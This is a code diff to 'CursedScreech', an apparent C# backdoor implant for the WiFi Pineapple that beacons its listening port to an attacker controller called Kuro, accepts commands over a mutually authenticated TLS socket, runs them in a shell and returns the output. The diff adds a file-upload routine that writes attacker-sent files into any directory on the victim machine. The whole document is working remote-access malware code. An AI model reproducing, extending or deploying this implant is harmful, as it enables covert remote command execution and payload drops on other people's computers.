@@ -21,7 +21,8 @@ namespace PineappleModules
      * 
      * Class:   CursedScreech
      * Author:  sud0nick
-     * Date:    March 3, 2016
+     * Created: March 3, 2016
+     * Updated: September 17, 2016
      * 
      * A class that sets up a multicast thread to broadcast back
      * to the Pineapple on which port it is listening, sets up a
@@ -35,11 +36,17 @@ namespace PineappleModules
         // ==================================================
         //                 CLASS ATTRIBUTES
         // ==================================================
+        private SslStream sslStream;
         private string msg = "";
         private int lport = 0;
         private static string certSerial = "";
         private static string certHash = "";
         private string command = "";
+        private Boolean recvFile = false;
+        private byte[] fileBytes;
+        private int fileBytesLeftToRead = 0;
+        private string fileName = "";
+        private string storeDir = "";
         private readonly string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
         private readonly string exeName = Path.GetFileNameWithoutExtension(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
 
@@ -106,6 +113,7 @@ namespace PineappleModules
                     // Send the listening socket information to Kuro
                     buffer = Encoding.ASCII.GetBytes(localIP + ":" + lport.ToString());
                     udpclient.Send(buffer, buffer.Length, kuro);
+                    //Console.WriteLine("Sent heartbeat to Kuro");
 
                     // Sleep for however long the heartbeat interval is set
                     Thread.Sleep(heartbeatInterval * 1000);
@@ -139,8 +147,7 @@ namespace PineappleModules
 
             bool connected = false;
             TcpClient client = new TcpClient();
-            Int32 bytesRecvd = 0;
-            string[] seps = new string[] { " " };
+            Int32 numBytesRecvd = 0;
             try {
 
                 // Start listening
@@ -151,26 +158,55 @@ namespace PineappleModules
                     client = listener.AcceptTcpClient();
 
                     try {
-                        var sslStream = new SslStream(client.GetStream(), false, atkCertValidation);
-                        sslStream.AuthenticateAsServer(csKey, true, (SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls), false);
+                        this.sslStream = new SslStream(client.GetStream(), false, atkCertValidation);
+                        this.sslStream.AuthenticateAsServer(csKey, true, (SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls), false);
 
                         connected = true;
                         while (connected) {
                             byte[] cmdRecvd = new Byte[4096];
 
-                            bytesRecvd = sslStream.Read(cmdRecvd, 0, cmdRecvd.Length);
+                            numBytesRecvd = this.sslStream.Read(cmdRecvd, 0, cmdRecvd.Length);
 
-                            if (bytesRecvd < 1) {
+                            if (numBytesRecvd < 1) {
                                 connected = false;
                                 client.Close();
                                 break;
                             }
 
-                            // Append the decrytped message to the command string
-                            command = Encoding.ASCII.GetString(cmdRecvd, 0, bytesRecvd);
+                            // If a file is being received we don't want to decode the data because we
+                            // need to store the raw bytes of the file
+                            if (this.recvFile) {
 
-                            Thread shellThread = new Thread(() => sendMsg(sslStream));
-                            shellThread.Start();
+                                int numBytesToCopy = cmdRecvd.Length;
+                                if (this.fileBytesLeftToRead < cmdRecvd.Length) {
+                                    numBytesToCopy = this.fileBytesLeftToRead;
+                                }
+
+                                // Append the received bytes to the fileBytes array
+                                System.Buffer.BlockCopy(cmdRecvd, 0, this.fileBytes, (this.fileBytes.Length - this.fileBytesLeftToRead), numBytesToCopy);
+                                this.fileBytesLeftToRead -= numBytesRecvd;
+
+                                // If we have finished reading the file, store it on the system
+                                if (this.fileBytesLeftToRead < 1) {
+
+                                    // Let the system know we've received the whole file
+                                    this.recvFile = false;
+
+                                    // Store the file on the system
+                                    storeFile(this.storeDir, this.fileName, this.fileBytes);
+                                    
+                                    // Clear the fileName and fileBytes variables
+                                    this.fileName = "";
+                                    this.fileBytes = new Byte[1];
+                                }
+
+                            } else {
+                                // Assign the decrytped message to the command string
+                                this.command = Encoding.ASCII.GetString(cmdRecvd, 0, numBytesRecvd);
+
+                                Thread shellThread = new Thread(() => sendMsg());
+                                shellThread.Start();
+                            }
                         }
                     }
                     catch (Exception) {
@@ -186,13 +222,31 @@ namespace PineappleModules
         // ==================================================
         //            METHOD TO SEND DATA TO KURO
         // ==================================================
-        private void sendMsg(SslStream cStream) {
-            string msg = command;
-            command = "";
-            string ret = exec(msg);
-            if (ret.Length > 0) {
-                byte[] retMsg = Encoding.ASCII.GetBytes(ret);
-                cStream.Write(retMsg, 0, retMsg.Length);
+        private void sendMsg() {
+            string msg = this.command;
+            this.command = "";
+
+            // Check if we are about to receive a file and prepare
+            // the appropriate variables to receive it
+            // Msg format is sendfile:fileName:byteArraySize
+            if (msg.Contains("sendfile;")) {
+
+                this.recvFile = true;
+                string[] msgParts = msg.Split(';');
+                this.fileName = msgParts[1];
+                this.fileBytesLeftToRead = Int32.Parse(msgParts[2]);
+                this.storeDir = msgParts[3];
+                this.fileBytes = new Byte[this.fileBytesLeftToRead];
+
+            } else {
+
+                // If we are not expecting a file we simply execute
+                // the received command in the shell and return the results
+                string ret = exec(msg);
+                if (ret.Length > 0) {
+                    byte[] retMsg = Encoding.ASCII.GetBytes(ret);
+                    this.sslStream.Write(retMsg, 0, retMsg.Length);
+                }
             }
         }
 
@@ -227,6 +281,21 @@ namespace PineappleModules
         }
 
         // ==================================================
+        //          METHOD TO STORE A RECEIVED FILE 
+        // ==================================================
+        private void storeFile(string dir, string name, byte[] file) {
+            // If the directory doesn't exist, create it
+            Directory.CreateDirectory(dir);
+
+            // Write the file out to the directory
+            File.WriteAllBytes(dir + name, file);
+
+            // Tell Kuro the file was stored
+            byte[] retMsg = Encoding.ASCII.GetBytes("Received and stored file " + name + " in directory " + dir);
+            this.sslStream.Write(retMsg, 0, retMsg.Length);
+        }
+
+        // ==================================================
         //           METHOD TO LOAD KEYS FROM A PFX
         // ==================================================
         private X509Certificate2 loadKeys(string key, string password) {
@@ -240,8 +309,8 @@ namespace PineappleModules
         //        METHOD TO VERIFY KURO'S CERTIFICATE
         // ==================================================
         private static bool atkCertValidation(Object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) {
-            Console.WriteLine(BitConverter.ToString(cert.GetSerialNumber()));
-            Console.WriteLine(cert.GetCertHashString());
+            //Console.WriteLine(BitConverter.ToString(cert.GetSerialNumber()));
+            //Console.WriteLine(cert.GetCertHashString());
             if (certSerial != "") {
                 if (BitConverter.ToString(cert.GetSerialNumber()) != certSerial) { return false; }
             }
